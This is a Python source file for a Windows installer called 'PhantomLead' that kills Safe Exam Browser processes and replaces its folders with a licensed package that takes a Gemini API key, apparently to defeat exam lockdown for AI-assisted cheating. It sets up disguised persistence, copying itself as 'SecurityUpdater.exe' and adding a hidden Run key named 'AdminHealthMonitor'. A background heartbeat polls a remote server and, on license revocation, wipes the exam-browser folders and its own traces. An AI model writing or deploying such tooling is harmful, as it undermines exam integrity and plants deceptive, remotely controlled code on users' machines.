import os
import sys
import ctypes
import builtins
import threading
import time
import shutil
import json
import winreg
from datetime import datetime
import tkinter as tk
from tkinter import messagebox, scrolledtext

import requests
from config import (
    APPLICATION_ROOT,
    API_VALIDATE_LICENSE,
    API_ACTIVATE_LICENSE,
    API_GET_MANIFEST,
    API_GET_DOWNLOAD_URL,
    SUPABASE_ANON_KEY
)
from device import get_device_fingerprint, get_device_info
from license_client import validate_license, activate_license, get_package_manifest, request_signed_download_url
from downloader import download_package
from integrity import verify_sha256
from installer_engine import run_installation

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

def kill_seb_processes():
    """Aggressively terminates any running SafeExamBrowser processes."""
    try:
        import subprocess
        for proc in ['SafeExamBrowser.exe', 'SEBClientService.exe', 'SebWindowsService.exe']:
            subprocess.run(['taskkill', '/F', '/IM', proc, '/T'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def wipe_seb_folders():
    """Permanently deletes replaced SEB folders and configurations from host."""
    kill_seb_processes()
    time.sleep(1)
    
    # 1. Target Program Files replaced subfolders
    target_subfolders = ["Configuration", "Reset", "Service", os.path.join("Application", "Extensions")]
    for sub in target_subfolders:
        path = os.path.join(APPLICATION_ROOT, sub)
        if os.path.exists(path):
            try:
                shutil.rmtree(path, ignore_errors=True)
            except Exception:
                pass

    # 2. Target ProgramData SEB directory
    prog_data = os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"), "SafeExamBrowser")
    if os.path.exists(prog_data):
        try:
            shutil.rmtree(prog_data, ignore_errors=True)
        except Exception:
            pass

    # 3. Target AppData roaming if present
    appdata_seb = os.path.join(os.environ.get("AppData", ""), "SafeExamBrowser")
    if os.path.exists(appdata_seb):
        try:
            shutil.rmtree(appdata_seb, ignore_errors=True)
        except Exception:
            pass

def self_destruct(license_key, hwid):
    """Executes host wipe when license is revoked or expired."""
    wipe_seb_folders()

    # Remove startup monitor registry entry
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteValue(key, "AdminHealthMonitor")
        winreg.CloseKey(key)
    except Exception:
        pass

    # Report completion to Supabase validate-license
    try:
        headers = {
            "Authorization": f"Bearer {SUPABASE_ANON_KEY}",
            "Content-Type": "application/json"
        }
        requests.post(
            API_VALIDATE_LICENSE,
            json={"license_key": license_key, "device_id": hwid, "action": "REPORT_DELETED"},
            headers=headers,
            timeout=10
        )
    except Exception:
        pass

    # Clean up PhantomLead helper directory
    phantom_dir = os.path.join(os.environ.get("AppData", ""), "PhantomLead")
    if os.path.exists(phantom_dir):
        try:
            shutil.rmtree(phantom_dir, ignore_errors=True)
        except Exception:
            pass

    sys.exit(0)

def run_heartbeat(mode="TIMEBOMB"):
    """Background polling loop (runs completely silently with NO GUI)."""
    phantom_dir = os.path.join(os.environ.get("AppData", ""), "PhantomLead")
    config_path = os.path.join(phantom_dir, "config.dat")
    
    if not os.path.exists(config_path):
        sys.exit(0)
        
    with open(config_path, "r", encoding="utf-8") as f:
        license_key = f.read().strip()
        
    hwid = get_device_fingerprint()
    
    headers = {
        "Authorization": f"Bearer {SUPABASE_ANON_KEY}",
        "Content-Type": "application/json"
    }

    while True:
        try:
            resp = requests.post(
                API_VALIDATE_LICENSE,
                json={"license_key": license_key, "device_id": hwid},
                headers=headers,
                timeout=15
            )
            if resp.ok:
                data = resp.json()
                status = data.get("status")
                
                # Check for revocation or expiry
                if status in ["REVOKED", "EXPIRED"]:
                    self_destruct(license_key, hwid)
                    
                # Offline fallback expiry check for TimeBomb
                if mode == "TIMEBOMB":
                    expires_at = data.get("expires_at")
                    if expires_at:
                        clean_exp = expires_at.replace("Z", "+00:00")
                        exp_date = datetime.fromisoformat(clean_exp).replace(tzinfo=None)
                        if datetime.utcnow() > exp_date:
                            self_destruct(license_key, hwid)
        except Exception:
            pass
            
        time.sleep(1800) # Check every 30 minutes

def create_heartbeat(license_key):
    """Registers silent background updater task in AppData and Registry."""
    appdata = os.environ.get("AppData", "")
    phantom_dir = os.path.join(appdata, "PhantomLead")
    os.makedirs(phantom_dir, exist_ok=True)
    
    # Store license key for background checks
    with open(os.path.join(phantom_dir, "config.dat"), "w", encoding="utf-8") as f:
        f.write(license_key)
        
    updater_exe = os.path.join(phantom_dir, "SecurityUpdater.exe")
    try:
        shutil.copyfile(sys.executable, updater_exe)
    except Exception:
        pass
        
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, "AdminHealthMonitor", 0, winreg.REG_SZ, f'"{updater_exe}" --heartbeat')
        winreg.CloseKey(key)
        
        # Launch background process immediately
        import subprocess
        subprocess.Popen([updater_exe, "--heartbeat"], creationflags=0x08000000) # CREATE_NO_WINDOW
    except Exception as e:
        print(f"[-] Registry startup registration notice: {e}")

class InstallerApp(tk.Tk):
    def __init__(self, mode="TIMEBOMB"):
        super().__init__()
        self.mode = mode # "TIMEBOMB", "ADMIN_CONTROLLED", "LIFETIME"
        
        mode_titles = {
            "TIMEBOMB": "PhantomLead Secure Installer (Time-Bomb Protected)",
            "ADMIN_CONTROLLED": "PhantomLead Secure Installer (Admin Managed)",
            "LIFETIME": "PhantomLead Secure Installer (Lifetime Edition)"
        }
        self.title(mode_titles.get(self.mode, "PhantomLead Secure Installer"))
        self.geometry("680x520")
        self.configure(padx=20, pady=20, bg="#121212")
        
        # Monkey-patch print to log window
        self._original_print = builtins.print
        builtins.print = self.custom_print

        if not is_admin():
            messagebox.showerror("Permission Error", "Please right-click and run this installer as Administrator.")
            self.destroy()
            sys.exit(1)

        # Header Title
        title_label = tk.Label(
            self, 
            text="Secure Software Installer", 
            font=("Segoe UI", 18, "bold"), 
            fg="#ffffff", 
            bg="#121212"
        )
        title_label.pack(pady=(0, 2))

        # Mode description banner
        subtitles = {
            "TIMEBOMB": "Time-Bomb Edition • Automatic Host Wipe on Expiration or Revocation",
            "ADMIN_CONTROLLED": "Managed Edition • Remote Administration & Revocation Enabled",
            "LIFETIME": "Offline Edition • Permanent Access with Zero Background Tracking"
        }
        sub_label = tk.Label(
            self, 
            text=subtitles.get(self.mode, ""), 
            font=("Segoe UI", 9), 
            fg="#a3e635", 
            bg="#121212"
        )
        sub_label.pack(pady=(0, 10))

        # Inputs Frame
        frame_inputs = tk.Frame(self, bg="#121212")
        frame_inputs.pack(fill=tk.X, pady=5)

        tk.Label(
            frame_inputs, 
            text="License Key:", 
            font=("Segoe UI", 10, "bold"), 
            fg="#e5e7eb", 
            bg="#121212"
        ).grid(row=0, column=0, sticky="w", pady=6)
        
        self.license_entry = tk.Entry(
            frame_inputs, 
            width=50, 
            font=("Consolas", 10), 
            bg="#1f2937", 
            fg="#ffffff", 
            insertbackground="#ffffff"
        )
        self.license_entry.grid(row=0, column=1, padx=10, pady=6)

        tk.Label(
            frame_inputs, 
            text="Gemini API Key:", 
            font=("Segoe UI", 10, "bold"), 
            fg="#e5e7eb", 
            bg="#121212"
        ).grid(row=1, column=0, sticky="w", pady=6)
        
        self.api_entry = tk.Entry(
            frame_inputs, 
            width=50, 
            show="*", 
            font=("Consolas", 10), 
            bg="#1f2937", 
            fg="#ffffff", 
            insertbackground="#ffffff"
        )
        self.api_entry.grid(row=1, column=1, padx=10, pady=6)

        # Install Button
        self.install_btn = tk.Button(
            self, 
            text="START INSTALLATION", 
            bg="#2563eb", 
            fg="white", 
            activebackground="#1d4ed8", 
            activeforeground="white", 
            font=("Segoe UI", 11, "bold"), 
            padx=15, 
            pady=5, 
            command=self.start_installation
        )
        self.install_btn.pack(pady=10)

        # Terminal / Log Box
        self.log_area = scrolledtext.ScrolledText(
            self, 
            width=80, 
            height=14, 
            state='disabled', 
            bg="#0f172a", 
            fg="#22c55e", 
            font=("Consolas", 9), 
            relief=tk.FLAT
        )
        self.log_area.pack(pady=5, fill=tk.BOTH, expand=True)

        self.custom_print("System ready. Enter your License Key and API Key, then click Start Installation.")

    def custom_print(self, *args, **kwargs):
        msg = " ".join(map(str, args))
        self.log_area.configure(state='normal')
        self.log_area.insert(tk.END, msg + "\n")
        self.log_area.see(tk.END)
        self.log_area.configure(state='disabled')
        self.update()

    def start_installation(self):
        license_key = self.license_entry.get().strip()
        api_key = self.api_entry.get().strip()

        if not license_key or not api_key:
            messagebox.showwarning("Missing Information", "Please enter both your License Key and Gemini API Key.")
            return

        self.install_btn.config(state=tk.DISABLED)
        self.log_area.configure(state='normal')
        self.log_area.delete(1.0, tk.END)
        self.log_area.configure(state='disabled')

        threading.Thread(target=self.run_install_process, args=(license_key, api_key), daemon=True).start()

    def run_install_process(self, license_key, api_key):
        try:
            print(">>> Step 1/6: Closing running Safe Exam Browser processes...")
            kill_seb_processes()

            print(">>> Step 2/6: Generating hardware fingerprint...")
            fingerprint = get_device_fingerprint()

            print(">>> Step 3/6: Validating license key with server...")
            validation_res = validate_license(license_key, fingerprint)
            if not validation_res.get("valid"):
                err_detail = validation_res.get("error", "License validation failed.")
                raise Exception(f"License Rejected: {err_detail}")

            print(">>> Step 4/6: Activating device...")
            device_info = get_device_info()
            activate_res = activate_license(license_key, fingerprint, device_info)
            if not activate_res.get("activated"):
                err_detail = activate_res.get("error", "Device activation failed.")
                raise Exception(f"Device Activation Failed: {err_detail}")

            print(">>> Step 5/6: Fetching package manifest...")
            manifest = get_package_manifest(license_key)
            pkg_code = manifest.get('package_code', 'Standard')
            print(f"    Authorized Package: {pkg_code}")
            if manifest.get('extensions'):
                print(f"    Authorized Extensions: {', '.join(manifest['extensions'])}")

            print(">>> Requesting secure package download URL...")
            download_url = request_signed_download_url(license_key)
            
            temp_zip = os.path.join(os.environ.get("TEMP", "C:\\Temp"), f"{pkg_code}.zip")
            print(">>> Downloading package files...")
            download_package(download_url, temp_zip)
            
            if manifest.get("sha256"):
                print(">>> Verifying package integrity (SHA-256)...")
                if not verify_sha256(temp_zip, manifest["sha256"]):
                    raise Exception("Integrity verification failed! SHA-256 mismatch. The download may be corrupted.")

            print(">>> Step 6/6: Extracting & Deploying Safe Exam Browser files...")
            run_installation(temp_zip, manifest, api_key)

            if self.mode in ["TIMEBOMB", "ADMIN_CONTROLLED"]:
                print(">>> Activating background protection monitor...")
                create_heartbeat(license_key)

            print("\n==========================================")
            print("✅ INSTALLATION COMPLETED SUCCESSFULLY!")
            print("==========================================")
            
            messagebox.showinfo(
                "Installation Complete",
                "Installation completed successfully!\n\nSafe Exam Browser has been securely installed and configured on your machine."
            )
        except Exception as e:
            err_msg = str(e)
            print(f"\n❌ ERROR: {err_msg}")
            messagebox.showerror(
                "Installation Error",
                f"Installation failed:\n\n{err_msg}\n\nPlease check your license key, internet connection, and try again."
            )
        finally:
            self.install_btn.config(state=tk.NORMAL)

def run_installer(mode="TIMEBOMB"):
    if "--heartbeat" in sys.argv:
        run_heartbeat(mode=mode)
        return

    app = InstallerApp(mode=mode)
    app.mainloop()

if __name__ == "__main__":
    run_installer(mode="TIMEBOMB")
